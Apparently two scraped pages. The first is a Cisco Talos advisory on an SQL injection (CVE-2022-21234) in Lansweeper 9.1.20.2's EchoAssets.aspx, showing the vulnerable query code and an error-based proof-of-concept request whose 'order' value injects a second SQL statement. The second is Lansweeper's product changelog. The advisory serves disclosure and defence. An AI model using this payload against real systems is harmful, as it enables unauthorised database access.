=== Content from talosintelligence.com_fe35ba27_20250115_101741.html ===


* [Cisco Login](/users/auth/saml)

* [Intelligence Center](/reputation)

  + [# Intelligence Center](/reputation)
  + BACK
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* [Vulnerability Research](/vulnerability_info)

  + [# Vulnerability Research](/vulnerability_info)
  + BACK
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* [Incident Response](/incident_response)

  + [# Incident Response](/incident_response)
  + BACK
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* [Blog](https://blog.talosintelligence.com)
* [Support](https://support.talosintelligence.com)

More

* Security Resources

  # Security Resources

  + BACK
  Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* Media

  # Media

  + BACK
  Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* Company

  # Company

  + BACK
  Company
  + [About Talos](/about)
  + [Careers](/careers)

* Under Attack?
* [Cisco Login](/users/auth/saml)

## Contact Cisco Talos Incident Response

×

Close

This form is for Incident Response service inquiries only, including emergency network security needs.

For reputation or categorization inquiries, visit the [Talos Support site](/support).
For emergency DDoS mitigation assistance, please contact the [Cisco Secure DDoS Protection Team](https://www.cisco.com/c/en/us/products/collateral/security/ddos-emergency-attack-mitigation-aag.pdf).

Name

Company (optional)

Email address

Phone number

Preferred communication:

Email

Phone

What Incident Response Service are you interested in?
General Talos IR services and retainer information
Emergency Response
IR Plan
IR Playbooks
IR Readiness Assessment
Tabletop Exercises
Compromise Assessment
Threat Hunting
Cyber Range Training
Intelligence on Demand

Please provide as much detail as possible so we can best address your needs

I acknowledge that this is an inquiry for Incident Response services and that any other use of this form will not receive a response.

Send Email
Cancel

# Talos Vulnerability Report

### TALOS-2022-1443

## Lansweeper lansweeper EchoAssets.aspx SQL injection vulnerability

##### February 28, 2022

##### CVE Number

CVE-2022-21234

### Summary

An SQL injection vulnerability exists in the EchoAssets.aspx functionality of Lansweeper lansweeper 9.1.20.2. A specially crafted HTTP request can cause SQL injection. An attacker can make an authenticated HTTP request to trigger this vulnerability.

### Tested Versions

Lansweeper lansweeper 9.1.20.2

### Product URLs

lansweeper - <https://www.lansweeper.com/>

### CVSSv3 Score

9.1 - CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H

### CWE

CWE-89 - Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’)

### Details

Lansweeper is an IT Asset Management solution that gathers hardware and software information of computers and other devices on a computer network for management and compliance and audit purposes.

An exploitable SQL Injection vulnerability is related to an `order` parameter passed to : `/Scanning/Echo/EchoAssets.aspx` script.
Let us take a close look at the vulnerable source code :

```
LS\DAL\LsAgentRepository.cs

Line 15	public DataTable GetAssetsByGroupId(Guid groupId, int sort = 1, string order = "ASC", int page = 1)
Line 16	{
Line 17		if (sort < 1 || sort > 7)
Line 18		{
Line 19			sort = 1;
Line 20		}
Line 21		if (page < 1)
Line 22		{
Line 23			page = 1;
Line 24		}
Line 25		string[] array = new string[6] { "tblLsAgentAsset.Status", "CASE WHEN tblAssets.AssetName IS NULL THEN tblLsAgentAsset.ComputerUnique ELSE tblAssets.AssetName END", "tblAssets.IPNumeric", "tblAssets.LastLsAgent", "tblAssets.LsAgentVersion", "tblAssets.AssetType" };
Line 26		return DB.ExecuteDataset("SELECT tblLsAgentAsset.LsAgentAssetID, tblLsAgentAsset.AssetID, tblAssets.IPAddress, tblLsAgentAsset.Status, tblAssets.AssetType, tblLsAgentAsset.LastChanged, tblAssets.LastLsAgent, tblAssets.LsAgentVersion,  \r\n                                                    CASE WHEN tblAssets.AssetName IS NULL THEN tblLsAgentAsset.ComputerUnique ELSE tblAssets.AssetName END AS AssetName\r\n                                                    FROM tblLsAgentAsset\r\n                                                    LEFT JOIN tblAssets on tblAssets.AssetID = tblLsAgentAsset.AssetID\r\n                                                    WHERE [LsAgentGroupID] = @groupid AND tblLsAgentAsset.Status <> @deletedState ORDER BY " + array[sort - 1] + " " + order, (page - 1) * 100, page * 100, DB.NewDBParameter("@groupid", groupId), DB.NewDBParameter("@deletedState", 2));
Line 27	}

```

`order` parameter is provided by the user and is not sanitized at all. In `line 26` we can notice that `order` is concatenated with the SQL query string in a regular way which leads to SQL injection.
To trigger this vulnerability an attacker must be authenticated and have proper permissions.

### Exploit Proof of Concept

ERROR-BASED SQLi

REQUEST

```
GET /Scanning/Echo/EchoAssets.aspx?groupid=920a3ae8-9a6a-4675-bca8-6f8708400cdb&order=ASC%3bSELECT%20convert(int%2c%40%40version) HTTP/1.1
Host: 192.168.0.102:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: UserSettings=language=1; custauth=username=hacker&userdomain=; ASP.NET_SessionId=urnwlqmv1l5lmopoadrtppoe; __RequestVerificationToken_Lw__=murmHbbVXPpH1R3EJDgF1WQsZis+Gb6CAsLBYb/j9OSuLM7CD40h4xXqxvCgfuqmOaBtpmsC0k3x3MkQjRQ3HxsbCX8IuNomvCcIQQGKG+90p/DAA6+KM/DvgT9TnlopUM7bszIzCpwDZIsFkAQ7pGzCBKJjAHA4rfFqh3KhEaY=
Upgrade-Insecure-Requests: 1

```

RESPONSE

```
HTTP/1.1 500 Internal Server Error
Cache-Control: private
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/8.0
x-frame-options: SAMEORIGIN
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Thu, 06 Jan 2022 22:54:39 GMT
Connection: close
Content-Length: 2264

(...)
<div style="background-color: #FFFFE1; padding: 15px; border-radius: 6px; margin-top: 20px; min-height: 75px;"><b>Technical details:</b><br style="margin-bottom: 10px;"/><img src="/images/bug.png" style="float: left;margin-right:4px;" />Conversion failed when converting the nvarchar value &#39;Microsoft SQL Server 2014 (SP3) (KB4022619) - 12.0.6024.0 (X64)
    Sep  7 2018 01:37:51
    Copyright (c) Microsoft Corporation
    Express Edition (64-bit) on Windows NT 6.3 &lt;X64&gt; (Build 19043: ) (Hypervisor)
&#39; to data type int.</div>

```
### Timeline

2022-01-11 - Vendor disclosure

2022-02-21 - Vendor patched

2022-02-28 - Public Release

##### Credit

Discovered by Marcin "Icewall" Noga of Cisco Talos.

---

[Vulnerability Reports](/vulnerability_reports) [Next Report

TALOS-2022-1442](/vulnerability_reports/TALOS-2022-1442) [Previous Report

TALOS-2022-1444](/vulnerability_reports/TALOS-2022-1444)

* + ###### [Intelligence Center](/reputation)
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* + ###### [Vulnerability Research](/vulnerability_info)
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* + ###### [Incident Response](/incident_response)
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* + ###### Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* + ###### Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* + ###### Support
  + [Support Documentation](https://support.talosintelligence.com)
* + ###### Company
  + [About Talos](/about)
  + [Careers](/careers)
  + [Cisco Security](https://www.cisco.com/c/en/us/products/security/product-listing.html)

###### Follow us

[![Cisco](/assets/logo_cisco_white-d87b7f7d3152ad412e48aad924a972cc5b802b7a53cb56b0792a4456c9b7b3a5.svg)](http://tools.cisco.com/security/center/home.x)

©
2025
Cisco Systems, Inc. and/or its affiliates. All rights
reserved. View our
[Privacy Policy.](http://www.cisco.com/web/siteassets/legal/privacy_full.html)



=== Content from www.lansweeper.com_f8c24ab6_20250115_101744.html ===


[![Logo](https://cdn-website.lansweeper.com/wp-content/uploads/Lansweeper-Full-Logo-Grey-1-1.svg)](https://www.lansweeper.com)

* [About Us](https://www.lansweeper.com/about/)
* [Support](/support/)
* [Developer Portal](https://developer.lansweeper.com/)
* [Request Pricing](https://www.lansweeper.com/contact/contact-sales/)
* [Sign In](https://app.lansweeper.com/)
* [TRY NOW](https://app.lansweeper.com/try)
* EN
  + [ES](https://www.lansweeper.com/es/product/changelog/)
  + [DE](https://www.lansweeper.com/de/product/changelog/)

* Platform

  + Platform
  + [Platform Overview](https://www.lansweeper.com/product/)
    All Technology Asset Intelligence in 1 place.
  + [Asset Discovery](https://www.lansweeper.com/it-network-discovery/)
    In-depth discovery across the technology estate.
  + [Asset Inventory](https://www.lansweeper.com/it-network-inventory/)
    All asset data unified in one place.
  + [Insights](https://www.lansweeper.com/it-analytics/)
    Empower your decision-making with trusted data.
  + [Integrations](https://www.lansweeper.com/product/integrations/)
    Enrich any IT use case at scale.[TRY NOW](https://app.lansweeper.com/try)
* Why Lansweeper?

  + Why Lansweeper?
  + [Why Lansweeper?](https://www.lansweeper.com/solutions/)
    Lansweeper helps you to minimize risks and optimize your IT by providing actionable insight into your entire technology estate.
  + [By Role](https://www.lansweeper.com/solutions/by-role/)
    Complete visibility for everyone.

    [For System Administrators](https://www.lansweeper.com/solutions/roles/system-administrator/)
    [For IT Managers](https://www.lansweeper.com/solutions/roles/it-managers/)
    [For C-suite](https://www.lansweeper.com/solutions/roles/c-suite/)
    [For Cybersecurity Teams](https://www.lansweeper.com/solutions/roles/cybersecurity-team/)
    [For IT Support](https://www.lansweeper.com/solutions/roles/it-support/)
    [For MSPs](https://www.lansweeper.com/partners/msp/)
  + [By Use Case](https://www.lansweeper.com/solutions/use-cases/)
    Fuel any IT scenario.

    [IT Asset Discovery & Inventory](https://www.lansweeper.com/it-network-discovery/)
    [IT Service Management](https://www.lansweeper.com/solutions/use-cases/it-service-management/)
    [Cybersecurity](https://www.lansweeper.com/solutions/use-cases/cybersecurity/)
    [CAASM](https://www.lansweeper.com/solutions/use-cases/caasm/)
    [NIS2 Compliance](https://www.lansweeper.com/solutions/use-cases/nis2-directive-compliance/)
    [IT & OT Convergence](https://www.lansweeper.com/solutions/use-cases/ot-asset-management/)
  + [By Industry](https://www.lansweeper.com/solutions/industry/)
    Flexibility for your industry.

    [Education](https://www.lansweeper.com/solutions/industry/education/)
    [Healthcare](https://www.lansweeper.com/solutions/industry/healthcare/)
    [Manufacturing](https://www.lansweeper.com/solutions/industry/manufacturing/)
    [Public Sector](https://www.lansweeper.com/solutions/industry/public-sector/)[TRY NOW](https://app.lansweeper.com/try)
* [Integrations](https://www.lansweeper.com/product/integrations/)
* Partners

  + Partners
  + [Why Lansweeper for Partners?](https://www.lansweeper.com/partners/)
    Leverage the power of our data to accelerate growth.

    [Contact Us](https://www.lansweeper.com/partners/contact/)
  + [MSP](https://www.lansweeper.com/partners/msp/)
    Exceed customer expectations with data-driven managed services.
  + [Technology Partners](https://www.lansweeper.com/partners/technology-partners/)
    Integrate or embed our technology to build smarter solutions.
  + [Channel Partners](https://www.lansweeper.com/partners/channel-partners/)
    Whether you service, distribute, consult, or resell – we have partner programs to help you grow.
  + [Find a partner](https://www.lansweeper.com/partners/find-a-partner/)
    Find a trusted Lansweeper certified partner.
  + [Become a partner](https://www.lansweeper.com/partners/partner-signup/)
    Join our partner ecosystem.[TRY NOW](https://app.lansweeper.com/try)
* [Pricing](https://www.lansweeper.com/pricing/)
* Resources

  + Resources
  + [Resources](https://www.lansweeper.com/resources/)
    Browse resources tailored to your needs.
  + [Blog](https://www.lansweeper.com/blog/)
    Discover the latest product news, pro tips, and more.
  + [Support Help Center](/product/support/)
    Need help? Browse extensive resources.
  + [Success Stories](https://www.lansweeper.com/resources/testimonials/)
  + [Ebooks & White Papers](https://www.lansweeper.com/resources/ebooks-white-papers/)
    Detailed documents you can download for free.
  + [Webinars & Events](https://www.lansweeper.com/resources/events/)
    Register for live or virtual events.
  + [Report Library](https://www.lansweeper.com/resources/report/)
    Browse our extensive audit report library.
  + [Community](https://community.lansweeper.com/)
    Start a conversation with your peers.
  + [Developer Portal](https://developer.lansweeper.com)
  + [Free Tools](https://www.lansweeper.com/resources/free-tools/)
  + [Product Updates](https://www.lansweeper.com/product/new/)[TRY NOW](https://app.lansweeper.com/try)

[TRY NOW](https://app.lansweeper.com/try)

[Lansweeper](https://www.lansweeper.com) > [Platform](https://www.lansweeper.com/product/) > Changelog

# Changelog

### Type

On-prem

OT

* ### 12.2.1.6, LsPush 8.4.100.1, LsAgent Windows 12.2.0.1, SQL 1065

  09/01/2025

  If you use SQL LocalDB 2014, this release will update your database. Before updating to the newest version, make sure to [back up your installation](https://community.lansweeper.com/t5/lansweeper-maintenance/back-up-your-installation/ta-p/64309).

  + Changed: LAN-16841 Improved the performance and stability of Airwatch scanning.
  + Fixed: LAN-16443 Saving Intune data was extremely slow.
  + Fixed: LAN-16851 In rare cases the scan service could crash when an Entra ID scan was triggered.
  + Fixed: LAN-16949 Custom fields in the Helpdesk could return an “Invalid value” error.
  + Fixed: LAN-16975 CDP scanning could cause memory issues.
  + Fixed: LAN-17041 Editing a report could cause a long delay.
* ### 12.2.0.4, LsPush 8.4.100.1, LsAgent Windows 11.4.1.2, SQL 1060

  03/12/2024

  If you use SQL LocalDB 2014, this release will update your database. Before updating to the newest version, make sure to [back up your installation](https://community.lansweeper.com/t5/lansweeper-maintenance/back-up-your-installation/ta-p/64309).

  + Fixed: LAN-16727 Scanning large vCenters could result in an HTTP timeout.
  + Fixed: LAN-16852 New scans without SNMP data would be ignored if the existing asset already contained SNMP data.
  + Fixed: LAN-16936 Windows 2025 would show up as Windows 2022.
  + Fixed: LAN-16967 A number of issues related to the chart widget were resolved.
  + Fixed: LAN-16968 Deployments would fail due to BinaryFormatter errors.
* ### 12.1.0.1, LsPush 8.4.100.1, LsAgent Windows 11.4.1.2, SQL 1050

  06/11/2024

  If you use SQL LocalDB 2014, this release will update your database. Before updating to the newest version, make sure to [back up your installation](https://community.lansweeper.com/t5/lansweeper-maintenance/back-up-your-installation/ta-p/64309).

  + Added: LAN-16383 Asset radar can now pick up CDP packets and use them for asset discovery.
  + Added: LAN-16821 Added basic property synchronization of IT Discovery results to On-premises.
  + Changed: LAN-16511 Improved OT asset merging when a Network Discovery link has been established.
  + Changed: LAN-16515 Main modules of a busconfig are now consolidated with their duplicate models into a single asset.
  + Fixed: LAN-14402 Bar charts could become difficult to view if the height of the chart increased.
  + Fixed: LAN-16203 Extended display information was not correctly added to monitor assets.
  + Fixed: LAN-16296 Running a deployment with custom checks looking at the file version would not give an error message if the file did not exist.
  + Fixed: LAN-16370 OT data was removed by agentless scans.
  + Fixed: LAN-16378 vCenter targets could not be scanned due to irregular certificate issuer names.
  + Fixed: LAN-16441 The Last successful scan field showed too many credential names.
  + Fixed: LAN-16496 Session timeout errors could occur when scanning large vCenter environments.
  + Fixed: LAN-16586 The X-axis in the chart widget was not displayed correctly in Chromium browsers.
  + Fixed: LAN-16672 An empty helpdesk ticket was created when an email signature included an image.
  + Fixed: LAN-16681 Assets were not set to non-active or removed when missing from On-premises Active Directory.
  + Fixed: LAN-16706 Some Microsoft Apps were displaying incorrect names.
  + Fixed: LAN-16710 Certain iPad devices scanned via Intune could be duplicated.
  + Fixed: LAN-16744 A security issue was resolved.
  + Fixed: LAN-16828 Deployments with their run mode set as “Scanning credentials” were executing tasks under “System account” instead.
  + Fixed: LAN-16844 The web console would show a web error when an internet connection was not available.
* ### 12.0.0.10, LsPush 8.4.100.1, LsAgent Windows 11.4.1.2, SQL 1010

  29/10/2024

  If you use SQL LocalDB 2014, this release will update your database. Before updating to the newest version, make sure to [back up your installation](https://community.lansweeper.com/t5/lansweeper-maintenance/back-up-your-installation/ta-p/64309).

  + Changed: LAN-16709 The Lansweeper Scanning service has been upgraded to .NET Core 8.
  + Fixed: LAN-15279 Office365V2 scanning would randomly fail without an error.
* ### 11.4.1.9, LsPush 8.4.100.1, LsAgent Windows 11.4.1.2, SQL 1010

  17/10/2024

  If you use SQL LocalDB 2014, this release will update your database. Before updating to the newest version, make sure to [back up your installation](https://community.lansweeper.com/t5/lansweeper-maintenance/back-up-your-installation/ta-p/64309).

  + Fixed: LAN-16840 A security issue was fixed.
* ### OT – 3.7.6

  23/09/2024

  + Changed: ACME-24707 Improved the merge logic to prevent duplicates.
  + Changed: ACME-24895 Rectified product version in Authentication Tool.
* ### 11.4.1.4, LsPush 8.4.100.1, LsAgent Windows 11.1.10.0, SQL 1010

  11/09/2024

  If you use SQL LocalDB 2014, this release will update your database. Before updating to the newest version, make sure to [back up your installation](https://community.lansweeper.com/t5/lansweeper-maintenance/back-up-your-installation/ta-p/64309).

  + Fixed: ACME-22672 Asset lifecycle information was missing for new installations.
  + Fixed: LAN-16759 The helpdesk mail connection would fail when app.lansweeper.com was blocked.

* 1
* 2

 * …
* 23

![](data:image/svg+xml;base64...)![](https://cdn-website.lansweeper.com/wp-content/uploads/Lansweeper-Full-Logo-Grey-1.svg)

* [Platform](https://www.lansweeper.com/product/)
  [Asset Discovery](https://www.lansweeper.com/it-network-discovery/)
  [Asset Inventory](https://www.lansweeper.com/it-network-inventory/)
  [Asset Analytics](https://www.lansweeper.com/it-analytics/)
  [Integrations](https://www.lansweeper.com/product/integrations/)
  [What's New](https://www.lansweeper.com/product/new/)
  [Beta Program](https://www.lansweeper.com/product/beta/)
* [Why Lansweeper?](https://www.lansweeper.com/solutions/)
  [By Role](https://www.lansweeper.com/solutions/by-role/)
  [By Use Case](https://www.lansweeper.com/solutions/use-cases/)
  [By Industry](https://www.lansweeper.com/solutions/industry/)
* [Resources](https://www.lansweeper.com/resources/)
  [Blog](https://www.lansweeper.com/blog/)
  [Ebooks](https://www.lansweeper.com/resources/ebooks-white-papers/)
  [Webinars & Events](https://www.lansweeper.com/resources/events/)
  [Report Library](https://www.lansweeper.com/resources/report/)
  [Community](https://community.lansweeper.com/)
  [Newsroom](https://www.lansweeper.com/press/)
  [Developer Portal](https://developer.lansweeper.com)
* [Support](/support/)
  [Knowledge Base](https://community.lansweeper.com/t5/knowledge-base/ct-p/KB_Main)
  [Changelog](https://www.lansweeper.com/product/changelog/)
  [Contact Support](https://www.lansweeper.com/contact/contact-support/)

* [Integrations](https://www.lansweeper.com/product/integrations/)
* [Partners](https://www.lansweeper.com/partners/find-a-partner/)
* [Success stories](https://www.lansweeper.com/resources/testimonials/)
* [Pricing](https://www.lansweeper.com/pricing/)
* [Jobs](https://careers.lansweeper.com/)
* [Contact sales](https://www.lansweeper.com/contact/contact-sales/)
* [Try now](https://app.lansweeper.com/try)

* USA
   +1 877-277-9337 (Toll-free)
* USA
   +1 917 382 3697
* BE
   +32 52 696 696
* UK
   +44 203 695 7908
* [HQ: Fraterstraat 212 | 9820 Merelbeke, Belgium](https://maps.app.goo.gl/TPYyQ9ULpgnsBwsq9)
* BE 0538.668.417

Discover More:

* [OT Changelog](https://www.lansweeper.com/product/changelog/ot/)
* [Video | Installing Software with Lansweeper (5.2)](https://www.lansweeper.com/blog/video/video-installing-software-with-lansweeper-5-2/)
* [Update your installation](https://www.lansweeper.com/product/update-lansweeper/)

* [Copyright © 2024 Lansweeper](https://www.lansweeper.com)
* [Legal Policies](/about/legal/)
* [Trust Center](/about/trust/)
* [Status](https://status.lansweeper.com/)
* [Whistleblowing](https://www.lansweeper.com/whistleblowing/)


